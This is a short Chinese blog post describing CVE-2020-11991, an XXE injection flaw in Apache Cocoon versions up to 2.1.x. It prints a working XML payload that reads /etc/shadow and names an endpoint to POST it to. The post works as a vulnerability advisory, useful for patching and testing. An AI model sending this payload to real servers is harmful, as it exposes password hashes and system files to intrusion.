# Apache Cocoon XML 注入 [CVE-2020-11991] - 逗比大师 - 博客园

> 原文：[`www.cnblogs.com/0day-li/p/13663350.html`](https://www.cnblogs.com/0day-li/p/13663350.html)

受影响版本: Apache Cocoon <= 2.1.x

程序使用了 StreamGenerator 这个方法时,解析从外部请求的 xml 数据包未做相关的限制,恶意用户就可以构造任意的 xml 表达式,使服务器解析达到 XML 注入的安全问题。

以下是 apache 社区官方提供利用方式：

```
<!--?xml version="1.0" ?--> 
<!DOCTYPE replace [<!ENTITY ent SYSTEM 
"file:///etc/shadow"> ]> 
<userInfo> 
<firstName>John</firstName> 
<lastName>&ent;</lastName> 
</userInfo>
```

与普通 XXE 并无差别，向/v2/api/product/manger/getInfo 位置 POST 构造好的 xml 数据即可

来源:http://mail-archives.apache.org/mod_mbox/cocoon-users/202009.mbox/author